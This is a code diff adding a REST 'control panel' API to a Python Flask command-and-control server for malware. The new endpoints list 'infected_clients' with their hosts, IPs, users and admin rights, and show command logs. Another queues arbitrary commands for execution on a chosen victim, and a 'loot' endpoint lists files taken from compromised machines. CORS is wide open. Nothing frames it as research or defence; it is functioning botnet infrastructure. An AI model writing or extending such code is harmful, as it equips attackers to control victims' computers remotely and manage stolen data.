@@ -8,6 +8,9 @@ import json
 import sqlite3
 import sys
 from datetime import datetime
+from dotenv import load_dotenv
+
+load_dotenv()
 
 # Suppress Flask logging
 log = logging.getLogger('werkzeug')
@@ -272,6 +275,108 @@ def upload_file():
     print(f"{C.GRAY}    Saved to: {save_path}{C.RESET}")
     print(PROMPT, end="", flush=True)
     return "OK", 200
+
+
+# ==================== CONTROL PANEL REST API ====================
+
+@app.after_request
+def add_cors_headers(response):
+    response.headers['Access-Control-Allow-Origin'] = '*'
+    response.headers['Access-Control-Allow-Headers'] = 'Content-Type,Authorization'
+    response.headers['Access-Control-Allow-Methods'] = 'GET,POST,OPTIONS'
+    return response
+
+
+@app.route("/api/clients", methods=["GET", "OPTIONS"])
+def api_get_clients():
+    if request.method == "OPTIONS":
+        return "", 200
+
+    client_list = []
+    with cmd_lock:
+        for cid, info in infected_clients.items():
+            last_seen_str = info['last_seen'].strftime("%Y-%m-%d %H:%M:%S") if isinstance(info.get('last_seen'), datetime) else str(info.get('last_seen', ''))
+            client_list.append({
+                'id': cid,
+                'host': info.get('host', 'Unknown'),
+                'ip': info.get('ip', '0.0.0.0'),
+                'pid': int(info.get('pid', 0)),
+                'os': info.get('os', 'Unknown'),
+                'user': info.get('user', 'unknown'),
+                'admin': bool(info.get('admin', False)),
+                'first_seen': str(info.get('registered', '')),
+                'last_seen': last_seen_str,
+                'status': 'ALIVE',
+                'cpu_usage': 0.0,
+                'ram_usage': 0.0,
+                'disk_usage': 0.0,
+                'net_usage': 0.0
+            })
+    return jsonify(client_list), 200
+
+
+@app.route("/api/logs", methods=["GET", "OPTIONS"])
+def api_get_logs():
+    if request.method == "OPTIONS":
+        return "", 200
+
+    log_list = []
+    with sqlite3.connect(DB_FILE) as conn:
+        cursor = conn.cursor()
+        cursor.execute("SELECT id, client_id, command, output, timestamp FROM command_logs ORDER BY id DESC LIMIT 100")
+        for row in cursor.fetchall():
+            log_list.append({
+                'id': row[0],
+                'client_id': row[1],
+                'command': row[2],
+                'output': row[3],
+                'timestamp': row[4],
+                'status': 'SUCCESS'
+            })
+    return jsonify(list(reversed(log_list))), 200
+
+
+@app.route("/api/send_command", methods=["POST", "OPTIONS"])
+def api_send_command():
+    if request.method == "OPTIONS":
+        return "", 200
+
+    data = request.get_json(silent=True) or {}
+    client_id = data.get("client_id")
+    command = data.get("command")
+
+    if not client_id or not command:
+        return jsonify({"error": "Missing client_id or command"}), 400
+
+    with cmd_lock:
+        if client_id not in pending_commands:
+            pending_commands[client_id] = []
+        pending_commands[client_id].append(command)
+
+    db_log_command(client_id, command, "Queued via Control Panel API...")
+    return jsonify({"status": "QUEUED", "client_id": client_id, "command": command}), 200
+
+
+@app.route("/api/loot", methods=["GET", "OPTIONS"])
+def api_get_loot():
+    if request.method == "OPTIONS":
+        return "", 200
+
+    loot_list = []
+    if os.path.exists(LOOT_DIR):
+        for root, _, files in os.walk(LOOT_DIR):
+            for file in files:
+                fpath = os.path.join(root, file)
+                stat = os.stat(fpath)
+                client_name = os.path.basename(root)
+                loot_list.append({
+                    'name': file,
+                    'path': fpath.replace('\\', '/'),
+                    'size': stat.st_size,
+                    'timestamp': datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M:%S"),
+                    'client': client_name
+                })
+    return jsonify(loot_list), 200
 
 
 # ========== CLI FUNCTIONS ==========
